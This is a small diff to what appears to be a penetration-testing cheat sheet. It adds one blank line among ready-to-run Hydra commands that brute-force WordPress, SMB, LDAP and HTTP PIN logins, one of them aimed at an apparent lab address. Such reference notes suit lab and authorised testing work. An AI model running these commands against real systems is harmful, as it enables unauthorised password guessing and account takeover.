@@ -13,6 +13,7 @@ hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^U
 hydra -L usernames.txt -P passwords.txt $ip smb -V -f   SMB Brute Forcing
 hydra -L users.txt -P passwords.txt $ip ldap2 -V -f     LDAP Brute Forcing
 
+
 ---------------------------------------------------------------------------------
 
 hydra -l '' -P 3digits.txt -f -v 10.10.50.172 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
